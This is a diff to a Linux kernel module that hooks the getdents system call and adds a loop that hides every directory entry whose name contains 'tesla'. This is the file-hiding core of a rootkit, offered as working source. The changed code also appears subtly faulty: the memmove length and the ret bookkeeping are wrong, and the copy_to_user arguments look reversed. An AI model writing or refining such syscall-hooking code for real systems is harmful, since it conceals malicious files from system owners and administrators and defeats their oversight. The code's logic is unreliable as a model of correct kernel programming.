@@ -45,35 +45,34 @@ asmlinkage long tesla_getdents(unsigned int fd, struct linux_dirent __user *dirp
 {
 	int ret = orig_dents(fd, dirp, count);
     struct linux_dirent *p1 = kmalloc(ret, GFP_KERNEL);
-	struct linux_dirent *p2 = 0;
+	struct linux_dirent *p2 = p1;
+
+	int i;
+	i = 0;
+
+	if (ret == 0) {
+		kfree(p1);
+		return 0;
+	}
 	
 	if (copy_from_user(p1, dirp, ret) != 0) {
+		kfree(p1);
 		return -EACCES;
 	}
-	p2 = p1;
-
-	if (p2) {
-		printk("%d, %s", p2->d_reclen, "1 \n");
-		p2 = (struct linux_dirent *)((char *)p2 + (p2->d_reclen));
-		printk("%d, %s", p2->d_reclen, "2 \n");
-		p2 = (struct linux_dirent *)((char *)p2 + (p2->d_reclen));
-		printk("%d, %s", p2->d_reclen, "3 \n");
-
+	
+	while (i < ret && (p2->d_reclen != 0)) {
+		if (strstr(p2->d_name,"tesla")) {
+			memmove(p2, (struct linux_dirent *)((char *)p2 + (p2->d_reclen)), ret);
+			ret = ret - (p2->d_reclen);
+		}
+		else {
+			p2 = (struct linux_dirent *)((char *)p2 + (p2->d_reclen));
+			i = i + (p2->d_reclen);
+		}
 	}
-	// int i = 0;
-	// while (i < ret) {
-	// 	if (strstr(p2->d_name,"tesla")) {
-	// 		memmove(p2, p2 + (p2->d_reclen), ret - (p2-p1) - (p2->d_reclen));
-	// 		ret -= p2->d_reclen;
-	// 	}
-	// 	else {
-	// 		i += p2->d_reclen;
-	// 		p2 += p2->d_reclen;
-	// 	}
-	// }
 	
 	if(copy_to_user(p1, dirp, ret) != 0) {
-		printk("got here \n");
+		kfree(p1);
 		return -EACCES;
 	}
 	kfree(p1);
